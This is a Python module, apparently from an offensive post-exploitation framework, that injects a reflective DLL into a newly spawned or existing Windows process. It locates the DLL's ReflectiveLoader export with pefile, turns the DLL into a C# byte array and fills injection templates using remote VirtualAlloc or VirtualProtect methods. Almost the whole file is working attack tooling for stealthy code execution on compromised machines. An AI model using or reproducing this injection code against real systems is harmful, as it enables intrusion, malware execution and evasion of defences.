from core.Module import ModuleException
from modules.inject_shellcode import Inject_shellcode
from core import config
import pefile


class InjectDllReflectiveModuleException(ModuleException):
    pass


class Inject_dll_reflective(Inject_shellcode):
    _exception_class = InjectDllReflectiveModuleException
    short_help = "Inject a reflective DLL in a new (or existing) process"
    complete_help = r"""
        Author:     @stephenfewer
        Links:      https://github.com/stephenfewer/ReflectiveDLLInjection
              
        
        Inject a reflective DLL into a remote process
        
        
        Usage:
            #inject_shellcode dll_path [injection_type] [remote_process]
        
        Positional arguments:
            dll_path                    name of a .dll module in the 'reflective_dll/' directory
                                        the DLL must contain a ReflectiveLoader exported function
            injection_type              the process injection method to use for injecting shellcode
                                        Allowed values: 'remote_virtual', 'remote_virtual_protect'
                                        Default: 'remote_virtual'
            remote_process              path to an executable to spawn as a host process for the shellcode
                                        if you pass a pid it will try to inject into an existing running process
                                        Default: 'cmd.exe'

        Examples:
           
                                                
    """

    def __get_reflective_loader_offset(self, dll_path):
        pe_parser = pefile.PE(dll_path)
        for exported_function in pe_parser.DIRECTORY_ENTRY_EXPORT.symbols:
            if 'ReflectiveLoader' in exported_function.name:
                reflective_loader_rva = exported_function.address
                return hex(pe_parser.get_offset_from_rva(reflective_loader_rva))
        raise self._exception_class('The DLL does not contain a reflective loader function.\n')

    def _create_request(self, args):
        dll_path, injection_type, remote_process,\
            thread_timeout, thread_parameters, code_offset = self._parse_run_args(args)
        dll_path = config.modules_paths + 'reflective_dll/' + dll_path
        code_offset = str(self.__get_reflective_loader_offset(dll_path))
        with open(dll_path, 'rb') as file_handle:
            byte_arr = bytearray(file_handle.read())
        byte_arr_code = '{' + ",".join('0x{:02x}'.format(x) for x in byte_arr) + '}'
        byte_arr_code_csharp = self._template_shellcode_csharp % byte_arr_code
        if injection_type == 'remote_virtual_protect':
            return self._runtime_code_virtual_protect % (byte_arr_code_csharp, thread_parameters, remote_process,
                                                         thread_timeout, code_offset)
        else:
            return self._runtime_code % (byte_arr_code_csharp, thread_parameters, remote_process,
                                         thread_timeout, code_offset)